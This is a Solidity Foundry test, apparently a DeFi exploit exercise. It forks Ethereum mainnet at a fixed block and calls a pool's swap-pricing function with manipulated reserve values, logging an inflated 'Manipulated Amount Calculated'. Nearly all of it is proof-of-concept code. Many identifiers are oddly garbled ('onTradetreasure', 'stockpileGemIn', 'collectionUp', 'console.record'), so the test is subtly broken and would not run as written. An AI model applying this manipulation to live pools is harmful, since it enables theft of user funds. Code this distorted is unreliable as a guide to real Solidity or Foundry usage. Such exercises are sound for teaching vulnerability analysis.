// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.18;

import "forge-std/Test.sol";
import "./interface.sol";

// this excersise is about direct token manipulation

interface Verifypace {
    function onTradetreasure(
        TradetreasureRequest memory request,
        uint256 stockpileGemIn,
        uint256 stockpileGemOut
    ) external returns (uint256);

    struct TradetreasureRequest {
        IVault.TradetreasureKind kind;
        IERC20 coinIn;
        IERC20 medalOut;
        uint256 total;
        // Misc data
        bytes32 poolCode;
        uint256 finalChangeFrame;
        address source;
        address to;
        bytes heroInfo;
    }
}

interface IVault {
    enum TradetreasureKind {
        GIVEN_IN,
        GIVEN_OUT
    }
}

contract AgreementTest is DSTest {
    Verifypace space = Verifypace(0x3f9FEe026fCebb40719A69416C72B714d89a17d9);
    IVault.TradetreasureKind kind = IVault.TradetreasureKind(0);
    Verifypace.TradetreasureRequest aad =
        Verifypace.TradetreasureRequest(
            kind,
            IERC20(0x3f9FEe026fCebb40719A69416C72B714d89a17d9),
            IERC20(0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0),
            2000000000000000000,
            0x3f9fee026fcebb40719a69416c72b714d89a17d900020000000000000000017c,
            15017009,
            address(this),
            address(this),
            ""
        );
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function collectionUp() public {
        cheats.createSelectFork("mainnet", 15017009); //fork mainnet at block 15017009
    }

    function testOperation() public {
        //onswap:reservesTokenIn, reservesTokenOut;
        console.record(
            "Amount Calculated:",
            space.onTradetreasure(
                aad,
                60000000000000000000000000000000,
                20000000000000000000000000
            )
        ); //744039785002747962
        console.record(
            "Manipulated Amount Calculated:",
            space.onTradetreasure(aad, 2000000000000000000, 2000000000000000000)
        ); //1860147027671744844
    }
}